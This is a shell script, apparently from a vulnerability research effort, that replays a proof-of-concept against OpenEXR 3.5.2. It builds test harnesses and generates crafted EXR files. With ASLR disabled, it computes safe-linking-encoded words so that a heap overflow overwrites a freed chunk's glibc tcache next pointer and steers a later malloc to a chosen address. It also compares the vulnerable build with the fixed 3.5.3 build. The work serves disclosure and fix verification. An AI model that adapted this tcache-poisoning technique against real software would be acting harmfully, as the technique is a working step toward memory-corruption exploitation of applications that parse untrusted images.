#!/bin/sh
# W187: one-command replay of file-chosen tcache-next steering.
#
# W184's fully file-chosen COPY2 window reaches the user data of a freed
# 0x3f0 chunk placed immediately after the 256-byte uncompressed_buffer.
# Its first eight bytes are the glibc safe-linked tcache next pointer.  A
# crafted EXR encodes a chosen word there; a later malloc(1000) follows it.
#
# Controls: valid baseline (no chosen bytes), uniform-byte file (unaligned
# next -> glibc abort), a second distinct target, and the fixed 3.5.3 build
# rejecting the same file.  Harness-supplied tcache grooming and ASLR-off
# are stated conditions; no wire, pointer-to-code, command or marker.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-mixed evidence

build_harness() {
    BUILD=$1 SRC=$2 OUT=$3
    mkdir -p "$OUT"
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    gcc -g -O1 -no-pie $INC harness/tcache_harness.c $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lstdc++ -lm -o "$OUT/tcache_harness"
}
if [ ! -x bin-vuln-plain/tcache_harness ]; then
    build_harness build-vuln-plain src/openexr-3.5.2 bin-vuln-plain
fi
if [ ! -x bin-fixed-plain/tcache_harness ]; then
    build_harness build-fixed-plain src/openexr-3.5.3 bin-fixed-plain
fi

BASE=work-mixed/baseline_deep_mixed.exr
UNIF=work-mixed/poc_mixed_full_5a.exr
T1=work-mixed/tcache-target-a.exr
T2=work-mixed/tcache-target-b.exr
bin-vuln-plain/gen_baseline_deep_mixed "$BASE" > /dev/null
python3 cases/make_poc_mixed_full.py "$BASE" "$UNIF" 64 0x5a 256 > /dev/null

hash() { sha256sum "$1" | cut -d' ' -f1; }
test "$(hash "$BASE")" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04
test "$(hash "$UNIF")" = \
    2ab3ea9751736720030d606cd3dd947dd000039da537a47bf822f1f18dd618f7

# Two-pass address discovery: absolute layout is fixed under setarch -R.
# The file bytes encode (B >> 12) ^ target under glibc safe linking.
DISCOVER=$(mktemp)
trap 'rm -f "$DISCOVER" "$RAW"' EXIT
setarch -R ./bin-vuln-plain/tcache_harness "$UNIF" > "$DISCOVER" 2>&1 || true
field() { awk -v k="$2" '$1=="PRIME" {for(i=1;i<=NF;i++){split($i,a,"="); if(a[1]==k){print a[2]; exit}}}' "$1"; }
B=$(field "$DISCOVER" B)
ANCHOR=$(field "$DISCOVER" anchor)
test -n "$B" && test -n "$ANCHOR"
W1=$(python3 -c "print(hex((int('$B',16)>>12) ^ int('$ANCHOR',16)))")
W2=$(python3 -c "print(hex((int('$B',16)>>12) ^ (int('$ANCHOR',16)+16)))")
python3 cases/make_tcache_poc.py "$BASE" "$T1" "$W1" 64 0x5a 256 \
    > evidence/tcache-gen.out
python3 cases/make_tcache_poc.py "$BASE" "$T2" "$W2" 64 0x5a 256 \
    >> evidence/tcache-gen.out
test "$(hash "$T1")" = 4937b5fce03ccadb839fbabbe6988e302671c3d31ea52ad13db91db15db6e18c

run() { # label binary file
    set +e
    setarch -R "$2" "$3" > "evidence/tcache-$1.raw" 2>&1
    echo $? > "evidence/tcache-$1.rc"
    set -e
    awk '{gsub(/0x[0-9a-f]+/, "ADDR"); print}' "evidence/tcache-$1.raw" \
        > "evidence/tcache-$1.out"
}
run uniform  ./bin-vuln-plain/tcache_harness "$UNIF"
run targeta  ./bin-vuln-plain/tcache_harness "$T1"
run targetb  ./bin-vuln-plain/tcache_harness "$T2"
run baseline ./bin-vuln-plain/tcache_harness "$BASE"
run fixed    ./bin-fixed-plain/tcache_harness "$T1"

relation() { # label expected_field
    RAW="evidence/tcache-$1.raw"
    X=$(field "$RAW" X)
    A=$(field "$RAW" anchor)
    M7=$(awk '/^M7=/{split($1,a,"=");print a[2]}' "$RAW")
    if [ "$2" = anchor ]; then WANT=$A; else
        WANT=$(python3 -c "print(hex(int('$A',16)+16))"); fi
    if [ "$M7" = "$WANT" ]; then HIT=1; else HIT=0; fi
    if [ "$M7" = "$X" ]; then XHIT=1; else XHIT=0; fi
    printf '%s next_field=%s M7=%s want=%s steer=%d fell_through_to_X=%d\n' \
        "$1" "$2" "$M7" "$WANT" "$HIT" "$XHIT"
}
: > evidence/tcache-relations.out
relation targeta anchor    >> evidence/tcache-relations.out
relation targetb anchor16  >> evidence/tcache-relations.out
relation baseline X        >> evidence/tcache-relations.out
relation fixed    X        >> evidence/tcache-relations.out

# Vulnerable crafted files: the chosen word reaches B->next and M7 follows it.
grep -Fq "TCACHE stored_next=0x00000000004e6ecc" evidence/tcache-targeta.raw
grep -Fq 'DECODE rv=31 EXR_ERR_INVALID_SAMPLE_DATA' evidence/tcache-targeta.raw
grep -Fq 'DECODE rv=31 EXR_ERR_INVALID_SAMPLE_DATA' evidence/tcache-targetb.raw
grep -Fq 'steer=1' evidence/tcache-relations.out
test "$(grep -c 'steer=1' evidence/tcache-relations.out)" -eq 2
grep -Fq 'targeta next_field=anchor' evidence/tcache-relations.out
grep -Fq 'targetb next_field=anchor16' evidence/tcache-relations.out
awk '$1=="baseline" && $2=="next_field=X" && $5=="steer=0" && $6=="fell_through_to_X=1" {f=1} END{exit !f}' evidence/tcache-relations.out
awk '$1=="fixed" && $2=="next_field=X" && $5=="steer=0" && $6=="fell_through_to_X=1" {f=1} END{exit !f}' evidence/tcache-relations.out

# Uniform-byte negative: unaligned chosen next makes glibc reject it.
test "$(cat evidence/tcache-uniform.rc)" -eq 134
grep -Fq 'TCACHE stored_next=0x5a5a5a5a5a5a5a5a' evidence/tcache-uniform.raw
grep -Fq 'malloc(): unaligned tcache chunk detected' evidence/tcache-uniform.raw

# Fixed 3.5.3 rejects the same crafted chunk before the sink.
grep -Fq 'DECODE rv=23 EXR_ERR_CORRUPT_CHUNK' evidence/tcache-fixed.raw
bin-fixed-asan/guarded_harness "$T1" 2>&1 \
    | grep -E '^(DECODE|GUARD-TOTAL)' > evidence/tcache-fixed-guard.out
grep -Fqx 'DECODE rv=23 EXR_ERR_CORRUPT_CHUNK' evidence/tcache-fixed-guard.out
grep -Fqx 'GUARD-TOTAL post-decode changed=0' evidence/tcache-fixed-guard.out

printf 'RESULT PASS\n'
sha256sum evidence/tcache-*.out
rm -f evidence/tcache-*.raw
